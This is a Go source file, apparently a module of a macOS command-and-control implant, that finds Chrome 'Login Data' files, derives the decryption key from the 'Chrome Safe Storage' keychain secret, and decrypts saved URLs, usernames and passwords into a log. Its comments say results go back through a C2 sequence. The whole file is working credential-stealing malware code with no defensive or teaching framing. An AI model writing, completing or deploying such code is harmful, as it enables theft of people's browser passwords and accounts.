//go:build darwin
// +build darwin

package auto

import (
	"bytes"
	"fix-project/mods/config"
	"os"
	"path/filepath"
)

// AutoModeChromeDecrypt attempts REAL decryption of Chrome "Login Data" on
// macOS, fully in-process except for one `security find-generic-password`
// call (which triggers the keychain ACL prompt unless the binary inherits a
// partition-id). Flow:
//   1. walk Chrome profile dirs for "Login Data" files
//   2. getDerivedKey(): security CLI -> "Chrome Safe Storage" secret ->
//      pbkdf2(saltysalt, 1003, 16) -> AES-128 key
//   3. processLoginDataFile(): copy db to /tmp, sqlite SELECT, AES-CBC v10
//      decrypt, plaintext "url | user | pass" lines into the log buffer
// Returns MSG_LOG with LOG_SUCCESS either way so the C2 sequence never loops;
// on any failure the log says why (no login data / keychain locked / etc).
func AutoModeChromeDecrypt() (string, [][]byte) {
	var buf bytes.Buffer

	userdata_dir := getUserdataDir()

	// 1) find every "Login Data" under the Chrome profile tree
	var login_files []string
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info == nil {
			return nil
		}
		if info.Name() == logins_data_file {
			login_files = append(login_files, path)
		}
		return nil
	})

	if len(login_files) == 0 {
		buf.WriteString("nothing found: no chrome login data\n")
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			buf.Bytes(),
		}
	}

	// 2) derive the AES key from the "Chrome Safe Storage" keychain secret
	mkey, err := getDerivedKey()
	if err != nil || len(mkey) == 0 {
		buf.WriteString("decrypt failed: chrome safe storage key unavailable (keychain locked or denied)\n")
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			buf.Bytes(),
		}
	}

	// 3) decrypt each Login Data file
	for _, lf := range login_files {
		buf.WriteString("== " + lf + "\n")
		processLoginDataFile(lf, mkey, &buf)
	}

	out := buf.Bytes()
	if len(bytes.TrimSpace(out)) == 0 {
		out = []byte("nothing found: login data empty or undecryptable\n")
	}

	return config.MSG_LOG, [][]byte{
		[]byte(config.LOG_SUCCESS),
		out,
	}
}
